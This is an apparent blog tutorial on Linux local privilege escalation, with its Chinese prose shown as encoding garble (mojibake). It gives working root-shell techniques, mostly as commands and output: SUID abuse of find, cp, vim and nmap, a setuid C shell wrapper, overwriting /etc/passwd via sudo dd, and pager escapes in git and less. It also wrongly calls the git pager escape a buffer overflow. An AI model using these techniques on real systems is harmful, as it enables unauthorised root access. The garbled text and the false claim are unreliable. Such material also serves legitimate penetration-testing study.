<p>å³å¦‚æœrootç»™ä¸€ä¸ªç¨‹åºèµ‹äºˆäº†SUIDæƒé™ï¼Œåˆ™æ™®é€šç”¨æˆ·åœ¨æ‰§è¡Œè¯¥ç¨‹åºè¿‡ç¨‹ä¸­ï¼Œæ˜¯rootæƒé™ã€‚</p>
</blockquote>
<hr>
<h3 id="å…³é”®"><a href="#å…³é”®" class="headerlink" title="*å…³é”®"></a>*å…³é”®</h3><p>1.æŸ¥çœ‹å…·æœ‰<code>root</code>ç”¨æˆ·æƒé™çš„<code>SUID</code>äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">å‘½ä»¤æ¥æŸ¥æ‰¾æ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºã€‚</span><br><span class="line"></span><br><span class="line">permæŒ‡å®šæƒé™ï¼Œ<span class="attribute">-u</span>=sä»£è¡¨SUIDæƒé™ï¼ŒtypeæŒ‡å®šæ–‡ä»¶ç±»å‹ï¼Œfè¡¨ç¤ºå¸¸è§„æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>2.å·²çŸ¥çš„å¯ç”¨æ¥ææƒçš„<code>linux</code>å¯æ‰§è¡Œçš„æ–‡ä»¶åˆ—è¡¨å¦‚ä¸‹</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">Nmapã€Vimã€<span class="built_in">find</span>ã€Bashã€<span class="built_in">More</span>ã€Lessã€Nanoã€cp</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><h4 id="ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell"><a href="#ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell"></a>ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell</h4><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -<span class="built_in">name</span> filename -<span class="built_in">exec</span> â€œ/bin/shâ€ \;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™ä¸ªfilenameï¼Œåªè¦å­˜åœ¨å°±è¡Œï¼Œç›®çš„æ˜¯è®©findå‘½ä»¤å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œåé¢çš„-execå°±æ˜¯åŠ ä¸Šå‘½ä»¤</p>
<p>è¿™é‡Œfindæœ‰suidæƒé™ï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œæ—¶ï¼Œä¼šå˜æˆrootç”¨æˆ·ï¼Œæ‰§è¡Œ&#x2F;bin&#x2F;shå‘½ä»¤æ—¶ï¼Œä¼šè¿›å…¥rootç”¨æˆ·ï¼Œä»è€Œå®ç°ææƒ</p>
<p>å¦‚æœfindæ²¡æœ‰suidæƒé™ï¼Œæ‰§è¡Œ&#x2F;bin&#x2F;shå‘½ä»¤åï¼Œä»ç„¶æ˜¯æ™®é€šç”¨æˆ·</p>
<p>Â·&#x2F;ä¸ºæ ¹ç›®å½•<br>Â·-name æŒ‰æ–‡ä»¶åæŸ¥æ‰¾<br>Â·-exec å¯¹åŒ¹é…å¯¹è±¡æ‰§è¡Œçš„å‘½ä»¤ï¼Œä»¥;ç»“æŸ<br>ä½†æ˜¯ï¼ˆ;ï¼‰æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦ç”¨ï¼ˆ\ï¼‰è½¬ä¹‰</p>
</blockquote>
<h4 id="ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell"><a href="#ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell"></a>ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell</h4><blockquote>
<p>ä»¥cpä¸ºä¾‹ï¼Œè¿™é‡Œç»™cpæ·»åŠ SUIDæƒé™åšæµ‹è¯•ï¼Œæ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºä¼šæœ‰rwxå˜æˆrwsã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220830133409844.png" alt="image-20220830133409844"></p>
<p>å¯ä»¥é€šè¿‡</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>å‘½ä»¤æ¥æŸ¥æ‰¾æ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220830133446426.png" alt="image-20220830133446426"></p>
<blockquote>
<p>å½“æ™®é€šç”¨æˆ·è¿è¡Œcpå‘½ä»¤æ—¶ï¼Œæ­¤æ—¶çš„cpæƒé™å°±ä¸ºrootï¼Œåˆ©ç”¨æ—¶ï¼Œå¯ä»¥cpæŠŠ&#x2F;etc&#x2F;passwdå¤åˆ¶åˆ°æ¡Œé¢ï¼Œç„¶åè¿›è¡Œä¿®æ”¹ã€‚</p>
<p>é¦–å…ˆç”¨opensslç”Ÿæˆä¸€ä¸ªå¯†ç ã€‚passwdå‚æ•°ä»£è¡¨ç”Ÿæˆä¸€ä¸ªå¯†ç ï¼Œ-1ä¸ºmd5ï¼Œ-saltæŒ‡å®šç›ï¼ˆéšæ„æŒ‡å®šï¼‰ï¼Œæœ€åè·Ÿè¦åŠ å¯†çš„å€¼ï¼Œä¹Ÿå°±æ˜¯å¯†ç abcd</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220830133504874.png" alt="image-20220830133504874"></p>
<blockquote>
<p>ç„¶åæŒ‰ç…§etc&#x2F;passwdçš„æ ¼å¼æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œæƒé™æŒ‰rootçš„å†™å³å¯ã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220830133645874.png" alt="image-20220830133645874"></p>
<blockquote>
<p>æ·»åŠ åæˆ‘ä»¬ç”¨cpå†æŠŠæ–‡ä»¶å¤åˆ¶å›å»è¿›è¡Œæ›¿æ¢ï¼Œæ­¤æ—¶å°±æ·»åŠ äº†ä¸€ä¸ªabcdç”¨æˆ·ï¼Œæƒé™ä¸ºrootã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220830133656254.png" alt="image-20220830133656254"></p>
<h4 id="ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell"><a href="#ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell"></a>ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell</h4><blockquote>
<p>vimåœ¨æœ‰SUIDæƒé™çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ç”¨æ¥è¿›è¡Œææƒæ“ä½œã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220830134124700.png" alt="image-20220830134124700"></p>
<blockquote>
<p>å½“vimè¢«èµ‹äºˆsuidæƒé™åï¼Œæ„å‘³ç€ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨vimå‘½ä»¤æ¥ç¼–è¾‘é‚£äº›åªèƒ½ç”±rootç¼–è¾‘çš„æ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡vimæ¥ç¼–è¾‘etc&#x2F;sudoersæ–‡ä»¶ï¼ˆæ™®é€šç”¨æˆ·ä¼šè¢«ç›´æ¥æ‹’ç»è®¿é—®ï¼‰ï¼Œåœ¨sudoersæ–‡ä»¶ä¸­é…ç½®æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œæƒé™å’Œrootä¸€æ ·ï¼Œè¿™é‡Œä»¥testç”¨æˆ·ä¸ºä¾‹ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p>
</blockquote>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">test   </span>ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<blockquote>
<p>vimç¼–è¾‘åä¿å­˜æ—¶ç”¨wq!å¼ºåˆ¶ä¿å­˜ï¼Œvimè¿è¡Œæ—¶è™½ç„¶æ˜¯rootæƒé™ï¼Œä½†wqä¾ç„¶ä¼šæç¤ºåªè¯»ã€‚</p>
<p>éšåsudo bashå°±ä¼šè·å–ä¸€ä¸ªrootçš„shellã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220830134159252.png" alt="image-20220830134159252"></p>
<h4 id="ï¼ˆ4ï¼‰åˆ©ç”¨nmapè·å–rootæƒé™shell"><a href="#ï¼ˆ4ï¼‰åˆ©ç”¨nmapè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ4ï¼‰åˆ©ç”¨nmapè·å–rootæƒé™shell"></a>ï¼ˆ4ï¼‰åˆ©ç”¨nmapè·å–rootæƒé™shell</h4><h5 id="1-æ—§ç‰ˆ"><a href="#1-æ—§ç‰ˆ" class="headerlink" title="1.æ—§ç‰ˆ"></a>1.æ—§ç‰ˆ</h5><blockquote>
<p>nmapï¼ˆ2.02-5.21ï¼‰å­˜åœ¨äº¤æ¢æ¨¡å¼ï¼Œå¯åˆ©ç”¨ææƒ</p>
</blockquote>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæ‰§è¡Œ:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>

<p>msfä¸­çš„æ¨¡å—ä¸ºï¼š</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>

<h5 id="2-æ–°ç‰ˆ"><a href="#2-æ–°ç‰ˆ" class="headerlink" title="2.æ–°ç‰ˆ"></a>2.æ–°ç‰ˆ</h5><blockquote>
<p>è¾ƒæ–°ç‰ˆå¯ä½¿ç”¨ <code>--script</code> å‚æ•°ï¼š</p>
</blockquote>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">å…ˆå†™å…¥ä¸€æ¡å‘½ä»¤</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br><span class="line">å†<span class="params">--script</span>å‚æ•°ï¼Œæ‰§è¡Œ</span><br><span class="line">sudo nmap <span class="params">--script=getshell</span></span><br></pre></td></tr></table></figure>

<p>æˆåŠŸææƒ</p>
<p><img src="/post/Linux-PowerUp/image-20221011132253611.png" alt="image-20221011132253611"></p>
<h4 id="ï¼ˆ5ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell"><a href="#ï¼ˆ5ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ5ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell"></a>ï¼ˆ5ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell</h4><blockquote>
<p>é™¤äº†ç³»ç»Ÿçš„ä¸€äº›å¯æ‰§è¡Œå‘½ä»¤ï¼Œè‡ªå·±å†™çš„å¯æ‰§è¡Œæ–‡ä»¶ä¹Ÿå¯æ·»åŠ SUIDæƒé™ã€‚ä¸è®ºcæˆ–è€…goæˆ–è€…å…¶ä»–è¯­è¨€éƒ½å¯ä»¥ï¼Œè¿™é‡Œä»¥cä¸ºä¾‹ã€‚</p>
</blockquote>
<p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨gccè¿›è¡Œç¼–è¯‘ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220830134227202.png" alt="image-20220830134227202"></p>
<p>ç¼–è¯‘åä¼ å…¥ç›®æ ‡æœºï¼Œè¿™é‡Œæ”¾åˆ°bin&#x2F;aaaç›®å½•ä¸‹ï¼Œç„¶åæ·»åŠ SUIDæƒé™æµ‹è¯•ã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220830134236889.png" alt="image-20220830134236889"></p>
<p>æ™®é€šç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶åï¼Œä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„shellã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220830134252824.png" alt="image-20220830134252824"></p>
<h2 id="2ï¼‰åˆ©ç”¨SUDOææƒ"><a href="#2ï¼‰åˆ©ç”¨SUDOææƒ" class="headerlink" title="2ï¼‰åˆ©ç”¨SUDOææƒ"></a>2ï¼‰åˆ©ç”¨SUDOææƒ</h2><h3 id="sudoå’Œsuçš„åŒºåˆ«"><a href="#sudoå’Œsuçš„åŒºåˆ«" class="headerlink" title="sudoå’Œsuçš„åŒºåˆ«"></a><strong>sudoå’Œsuçš„åŒºåˆ«</strong></h3><blockquote>
<p>1ï¼Œsudoæ˜¯ä»¥rootæƒé™å»è¿è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œsuæ˜¯å»åˆ‡æ¢ç”¨æˆ·çš„èº«ä»½ã€‚</p>
<p>2ï¼Œsudoåªè¦çŸ¥é“è‡ªå·±çš„å¯†ç å³å¯ï¼Œsuéœ€è¦çŸ¥é“è¢«åˆ‡æ¢ç”¨æˆ·çš„å¯†ç ã€‚</p>
</blockquote>
<h3 id="sudoersæ–‡ä»¶"><a href="#sudoersæ–‡ä»¶" class="headerlink" title="sudoersæ–‡ä»¶"></a><strong>sudoersæ–‡ä»¶</strong></h3><blockquote>
<p>&#x2F;etc&#x2F;sudoersæ–‡ä»¶ï¼Œæ˜¯sudoæƒé™çš„é…ç½®æ–‡ä»¶ã€‚å½“ä½¿ç”¨sudoæ¥å‘½ä»¤æ—¶ï¼Œlinuxç³»ç»Ÿä¼šåœ¨sudoersæ–‡ä»¶ä¸­æŸ¥æ‰¾å½“å‰ç”¨æˆ·ï¼Œæ ¹æ®å½“å‰ç”¨æˆ·æƒé™é…ç½®æ¥å†³å®šæ˜¯å¦å¯ä»¥è¿è¡Œç›¸å…³å‘½ä»¤ã€‚</p>
</blockquote>
<p>ä¾‹å¦‚æ·»åŠ testç”¨æˆ·çš„ç›¸å…³é…ç½®ï¼š</p>
<p><img src="/post/Linux-PowerUp/image-20220901223741370.png" alt="image-20220901223741370"></p>
<p>æ ¼å¼å¦‚ä¸‹ï¼š</p>
<p><img src="/post/Linux-PowerUp/image-20220901223808981.png" alt="image-20220901223808981"></p>
<h3 id="sudo-su-sudo-bash"><a href="#sudo-su-sudo-bash" class="headerlink" title="sudo su &amp;&amp; sudo bash"></a><strong>sudo su &amp;&amp; sudo bash</strong></h3><blockquote>
<p>å½“æ²¡æœ‰å¯¹æ™®é€šç”¨æˆ·åšä¸¥æ ¼çš„é™åˆ¶æ—¶ï¼Œæˆ–è€…é…ç½®æƒé™è¿‡å¤§æ—¶ï¼Œåˆ™å¯ä»¥å°è¯•sudo suæ¥åˆ‡æ¢åˆ°rootæƒé™ã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901223824172.png" alt="image-20220901223824172"></p>
<blockquote>
<p>æˆ–è€…æ‰§è¡Œsudo bashã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901223837242.png" alt="image-20220901223837242"></p>
<blockquote>
<p>å½“visudoå‘½ä»¤ä¸èƒ½ç”¨æ—¶ï¼Œé™åˆ¶äº†éƒ¨åˆ†å‘½ä»¤ï¼Œåˆ™å¯ä»¥å°è¯•ä¸‹vimæ˜¯å¦è¢«ç¦ç”¨ï¼Œsudo vimä¹Ÿå¯ä»¥ç¼–è¾‘sudoersæ–‡ä»¶ï¼Œä¸”wq!å¯ä»¥æˆåŠŸä¿å­˜ã€‚</p>
</blockquote>
<h4 id="SUDO-dd-ææƒæ³•"><a href="#SUDO-dd-ææƒæ³•" class="headerlink" title="*SUDO -dd ææƒæ³•"></a>*SUDO -dd ææƒæ³•</h4><p><a href="https://www.cnblogs.com/zlgxzswjy/p/12746160.html">åŸæ–‡</a>            </p>
<blockquote>
<p>å½“ç”¨æˆ·å¯ä»¥é€šè¿‡sudoæ‰§è¡Œddå‘½ä»¤æ—¶ï¼Œå¯ä»¥è¢«ç”¨æ¥ææƒã€‚é€šè¿‡ddå‘½ä»¤è¦†ç›–åŸå§‹&#x2F;etc&#x2F;passwdæ–‡ä»¶ï¼Œä»¥è¾¾åˆ°ä¿®æ”¹å¯†ç çš„ç›®çš„</p>
</blockquote>
<p>1ã€åˆ›å»ºä¸€ä¸ªå·²çŸ¥å¯†ç çš„hashï¼Œä»¥å¤‡æ›¿æ¢æ—¶ä½¿ç”¨</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/etc</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span> -salt <span class="number">123</span> password </span><br><span class="line"><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="title class_">KRa5a</span>.</span><br></pre></td></tr></table></figure>

<p>2ã€å¤‡ä»½åŸå§‹passwdæ–‡ä»¶ï¼Œä»¥é˜²ä¿®æ”¹é”™è¯¯æ—¶æ— æ³•è®¿é—®</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /etc/passwd /tmp/passwd</span></span><br></pre></td></tr></table></figure>

<p>3ã€åˆ©ç”¨ç¬¬ä¸€æ­¥é‡Œç”Ÿæˆçš„hashæ„å»ºæ–°çš„passwd hashæ¡ç›®</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment"># cat passwd</span></span><br><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="symbol">KRa5a.:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>4ã€ä½¿ç”¨ddè¦†ç›–åŸå§‹passwdæ–‡ä»¶</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hh</span>@hh:/tmp$ cat passwd|sudo dd of=/etc/passwd </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records in </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records out</span><br><span class="line"><span class="attribute">1757</span> bytes (<span class="number">1</span>.<span class="number">8</span> kB, <span class="number">1</span>.<span class="number">7</span> KiB) copied, <span class="number">0</span>.<span class="number">000397129</span> s, <span class="number">4</span>.<span class="number">4</span> MB/s</span><br></pre></td></tr></table></figure>

<p>5ã€ä½¿ç”¨åˆšæ‰åˆ›å»ºhashæ—¶ä½¿ç”¨çš„å¯†ç è¿›è¡Œç™»å½•</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="variable">$su</span> root</span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">root<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>ææƒæˆåŠŸï¼</p>
<h4 id="GIT"><a href="#GIT" class="headerlink" title="*GIT"></a>*GIT</h4><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">è¾“å…¥sudo -l</span><br><span class="line"><span class="comment">//åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/Linux-PowerUp/image-20220901112624228.png" alt="image-20220901112624228"></p>
<p><strong><u>å°±å¯ä»¥å‘ç°<code>root</code>ä»¥<code>nopasswd</code>ã€ä¸éœ€è¦å¯†ç ã€‘è¿è¡Œgitå‘½ä»¤</u></strong></p>
<p>åŸç†æ˜¯gitå­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼Œ</p>
<p>åœ¨ä½¿ç”¨</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>ä¸éœ€è¦è¾“å…¥rootå¯†ç ï¼Œå³å¯ä»¥rootèº«ä»½æ‰§è¡Œè¿™æ¡å‘½ä»¤</p>
<p>æ“ä½œå¦‚ä¸‹</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span>     </span><br><span class="line">//-<span class="selector-tag">p</span>æ˜¯åˆ†é¡µæŸ¥çœ‹ï¼Œè¿™ä¸ªåŸç†å°±æ˜¯ç»ˆç«¯çš„çª—å£å¤§å°ä¸å¤Ÿæ˜¾ç¤ºï¼Œæ‰€ä»¥ä¸‹æ–¹ä¼šå‡ºç°å†’å·ï¼Œç­‰å¾…è¾“å…¥å‘½ä»¤</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å¯ä»¥çœ‹çœ‹åŒºåˆ«</p>
<h5 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="*æ³¨æ„"></a>*æ³¨æ„</h5><h6 id="1-çª—å£è¶³å¤Ÿå¤§"><a href="#1-çª—å£è¶³å¤Ÿå¤§" class="headerlink" title="1.çª—å£è¶³å¤Ÿå¤§"></a>1.çª—å£è¶³å¤Ÿå¤§</h6><p><img src="/post/Linux-PowerUp/image-20220901113721300.png" alt="image-20220901113721300"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºå®Œäº†ï¼Œå°±æœ‰å›åˆ°åŸå¤„äº†</p>
<h6 id="2-çª—å£å°ä¸€äº›"><a href="#2-çª—å£å°ä¸€äº›" class="headerlink" title="2.çª—å£å°ä¸€äº›"></a>2.çª—å£å°ä¸€äº›</h6><p><img src="/post/Linux-PowerUp/image-20220901113851826.png" alt="image-20220901113851826"></p>
<p>ä¸‹æ–¹å°±æ˜¾ç¤ºå‡º:ï¼Œç­‰å¾…è¾“å…¥</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">**:æ˜¯è‡ªå¸¦æœ‰çš„ï¼Œä¸æ˜¯è¾“å…¥çš„</span><br><span class="line">:!/bin/sh    //æ„Ÿå¹å·!æ˜¯shellè½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥è¦é¿å…sudoæˆæƒç”¨æˆ·ä½¿ç”¨viï¼Œvimï¼Œftpï¼Œleeï¼Œmoreï¼Œgit</span><br><span class="line">è¿›å…¥root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">å½“ç„¶ä¹Ÿå¯ä»¥æ‰§è¡Œ:!passwd root</span><br><span class="line">ä¿®æ”¹å…¶å¯†ç </span><br><span class="line">ç„¶åsu rootç™»å½•ä¹Ÿå¯</span><br></pre></td></tr></table></figure>

<h5 id="1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"><a href="#1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell" class="headerlink" title="1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"></a>1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell</h5><p><code>$</code>å˜æˆ<code>#</code>æˆåŠŸ</p>
<p><img src="/post/Linux-PowerUp/image-20220901114902493.png" alt="image-20220901114902493"></p>
<h5 id="2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•"><a href="#2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•" class="headerlink" title="2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•"></a>2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•</h5><p><img src="/post/Linux-PowerUp/image-20220901114453769.png" alt="image-20220901114453769"></p>
<p><code>$</code>å˜æˆ<code>#</code>ï¼ŒæˆåŠŸç™»å½•</p>
<p><img src="/post/Linux-PowerUp/image-20220901114726423.png" alt="image-20220901114726423"></p>
<h4 id="å…¶ä»–å‘½ä»¤"><a href="#å…¶ä»–å‘½ä»¤" class="headerlink" title="å…¶ä»–å‘½ä»¤"></a><strong>å…¶ä»–å‘½ä»¤</strong></h4><p>ä¹Ÿæœ‰å¾ˆå¤šå…¶ä»–å‘½ä»¤å¯ä»¥ç”¨æ¥ææƒï¼Œå’Œä¹‹å‰çš„SUIDææƒä¸­è¯´çš„å‘½ä»¤ç±»ä¼¼ï¼Œä¾‹å¦‚sudoå…è®¸findå‘½ä»¤ï¼Œåˆ™å¯ä»¥é€šè¿‡execå‚æ•°æ¥åˆ‡æ¢åˆ°rootæƒé™ã€‚</p>
<p>è¿™é‡Œæ·»åŠ æ–°ç”¨æˆ·aaaï¼Œå¹¶ä¿®æ”¹sudoersæ–‡ä»¶ï¼Œå…è®¸éƒ¨åˆ†å‘½ä»¤ï¼Œå†…å®¹å¦‚ä¸‹ã€‚</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">aaa  ALL=(ALL:ALL) <span class="regexp">/usr/</span>bin<span class="regexp">/find,/u</span>sr<span class="regexp">/bin/</span>perl,<span class="regexp">/usr/</span>bin<span class="regexp">/python3,/u</span>sr<span class="regexp">/bin/</span>less,<span class="regexp">/usr/</span>bin<span class="regexp">/awk,/u</span>sr<span class="regexp">/bin/m</span>an,<span class="regexp">/usr/</span>bin/vi</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶aaaç”¨æˆ·ä½¿ç”¨sudoå°±åªèƒ½æ‰§è¡Œé…ç½®å¥½çš„å‘½ä»¤ï¼Œsudo suå’Œsudo bashè¢«ç¦æ­¢æ‰§è¡Œã€‚</p>
<p><img src="/post/Linux-PowerUp/image-20220901224325691.png" alt="image-20220901224325691"></p>
<p>ç›¸å…³å‘½ä»¤ææƒæ–¹å¼å¦‚ä¸‹ï¼š</p>
<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><blockquote>
<p><code>exec</code>å‚æ•°ç”¨æ¥æŒ‡å®šæœç´¢ç»“æœçš„å¤„ç†å‘½ä»¤ï¼Œéœ€è¦ä»¥åˆ†å·ç»“å°¾ï¼Œåˆ†å·åœ¨å‘½ä»¤è¡Œæœ‰ç‰¹æ®Šå‡½æ•°ï¼Œè¦ç”¨<code>\</code>è¿›è¡Œè½¬ä¹‰ã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901224342169.png" alt="image-20220901224342169"></p>
<h5 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h5><blockquote>
<p><code>e</code>å‚æ•°ç”¨æ¥æŒ‡å®šè¦è¿è¡Œçš„å‘½ä»¤ï¼Œç„¶åä½¿ç”¨<code>linux</code>çš„<code>exec</code>å‚æ•°æ¥è°ƒç”¨<code>bash</code>ã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901224356163.png" alt="image-20220901224356163"></p>
<h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><blockquote>
<p><code>c</code>å‚æ•°å¯ä»¥åœ¨å‘½ä»¤è¡Œæ‰§è¡Œ<code>python</code>ä»£ç ï¼Œ<code>pty</code>åº“æ˜¯ä¸€ä¸ªä¼ªç»ˆç«¯åº“ï¼Œå®ƒçš„<code>spawn</code>ä¼šè°ƒç”¨æŒ‡å®šçš„ç¨‹åºã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901224409127.png" alt="image-20220901224409127"></p>
<h5 id="less"><a href="#less" class="headerlink" title="less"></a>less</h5><blockquote>
<p>è¾“å…¥<code>sudo less /etc/hosts</code>å‘½ä»¤æµè§ˆæ–‡ä»¶å†…å®¹æ—¶ï¼Œåˆ°åº•éƒ¨è¾“å…¥<code>!bash</code>åå›è½¦ï¼Œä¼šè·å¾—ä¸€ä¸ª<code>root</code>æƒé™çš„<code>shell</code>ã€‚</p>
</blockquote>
<p><img src="/post/Linux-PowerUp/image-20220901224420552.png" alt="image-20220901224420552"></p>
<p><img src="/post/Linux-PowerUp/image-20220901224511943.png" alt="image-20220901224511943"></p>
